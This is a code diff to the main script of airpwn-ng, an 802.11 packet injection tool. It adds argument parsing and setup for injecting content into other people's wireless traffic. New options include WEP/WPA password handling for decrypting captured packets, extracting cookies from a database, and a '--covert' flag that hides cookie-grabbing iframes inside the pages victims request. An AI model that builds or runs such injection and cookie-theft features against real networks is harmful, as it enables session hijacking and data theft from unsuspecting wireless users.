@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#! /usr/bin/python3
 
 import argparse
 import logging
@@ -6,6 +6,7 @@ import os
 import signal
 import subprocess
 import sys
+from lib.logger import Tee as tee
 from lib.styles import File
 from lib.visuals import Bcolors
 
@@ -45,9 +46,53 @@ def main(args):
     else:
         args.bWarn = 40
 
+    ## Logging
+    if args.l is not None:
+        stdOut = sys.stdout
+        sys.stdout = sys.stderr
+        sys.stderr = stdOut
+        oLog = open(args.l, 'w')
+        sys.stdout = tee(stdOut, oLog)
+
+    ## Enforce BSSID if WEP is chosen
+    if args.wep is not None and args.bssid is None:
+        print ('--wep requires --bssid\n')
+        sys.exit(1)
+
+    ## Enforce BSSID and ESSID if WPA is chosen
+    if args.wpa is not None and (args.bssid is None or args.essid is None):
+        print ('--wpa requires --bssid and --essid\n')
+        sys.exit(1)
+
     ## Lowercase BSSID
     if args.bssid is not None:
         args.bssid = args.bssid.lower()
+
+    ## Packet size
+    ## Observed packet lengths for a GET /
+    ## Can change depending upon NIC
+    ## Defaults have been set 4 bytes lower as a precaution
+    ## Adjust based according to your needs, or use -s 0
+    ## WPA TKIP  -- 216
+    ## WPA AES   -- 212
+    ## WPA2 TKIP -- 216
+    ## WPA2 AES  -- 212
+    ## WEP       -- 204
+    ## Open      -- 196
+
+    if args.wpa is not None:
+        if args.s is None:
+            args.s = 208
+    elif args.wep is not None:
+        if args.s is None:
+            args.s = 200
+        else:
+            args.s = int(args.s)
+    else:
+        if args.s is None:
+            args.s = 192
+        else:
+            args.s = int(args.s)
 
     ## NIC types
     if args.inj is None:
@@ -101,16 +146,29 @@ if __name__ == '__main__':
     ## ARGUMENT PARSING
     parser = argparse.ArgumentParser(description = 'airpwn-ng - the new and improved 802.11 packet injector')
     group = parser.add_mutually_exclusive_group(required = True)
+
+    group.add_argument('--cm',
+                       metavar = '<filename>',
+                       help = 'Extract cookies from the DB')
     group.add_argument('--injection',
                        metavar = '<filename>',
                        help = 'File with your injection code')
 
+    parser.add_argument('-b',
+                        action = 'store_true',
+                        help = 'Sniff both ways')
     parser.add_argument('-i',
                         metavar = '<interface>',
                         help = 'Your injection interface')
+    parser.add_argument('-l',
+                        metavar = '<outfile>',
+                        help = 'Logfile')
     parser.add_argument('-m',
                         metavar = '<interface>',
                         help = 'Your monitor interface')
+    parser.add_argument('-s',
+                        metavar = '<pkt size>',
+                        help = 'minimum size packet to decipher')
     parser.add_argument('-t',
                         nargs = '*',
                         metavar = '<MAC address>',
@@ -123,6 +181,9 @@ if __name__ == '__main__':
     parser.add_argument('--channel',
                         metavar = '<channel>',
                         help = 'Set the channel for the NICs')
+    parser.add_argument('--covert',
+                        action = 'store_true',
+                        help = 'Hides cookie grabbing iframes inside the requested page')
     parser.add_argument('--essid',
                         metavar = '<tgt ESSID>',
                         help = 'Target ESSID')
@@ -131,20 +192,21 @@ if __name__ == '__main__':
                         metavar = '<inj NIC type>',
                         help = 'Injector NIC type - mon or man')
     parser.add_argument('--mon',
-                        metavar = 'DO NOT USE - DEPRECATED',
-                        help = 'DO NOT USE - DEPRECATED')
+                        choices = ['mon', 'man'],
+                        metavar = '<mon nic type>',
+                        help = 'Monitor NIC type - mon or man')
+    parser.add_argument('--single',
+                        action = 'store_true',
+                        help = 'Single packet injection attempt')
     parser.add_argument('--trigger',
                         metavar = '<trigger>',
                         help = 'Trigger string for injection')
-    parser.add_argument('--tun',
-                        action = 'store_true',
-                        help = 'airtun-ng integration')
     parser.add_argument('--wep',
-                        metavar = 'DO NOT USE - DEPRECATED',
-                        help = 'DO NOT USE - DEPRECATED')
+                        metavar = '<wep password>',
+                        help = 'Password for WEP')
     parser.add_argument('--wpa',
-                        metavar = 'DO NOT USE - DEPRECATED',
-                        help = 'DO NOT USE - DEPRECATED')
+                        metavar = '<wpa password>',
+                        help = 'Password for WPA')
     args = parser.parse_args()
 
     ## ADD SIGNAL HANDLER
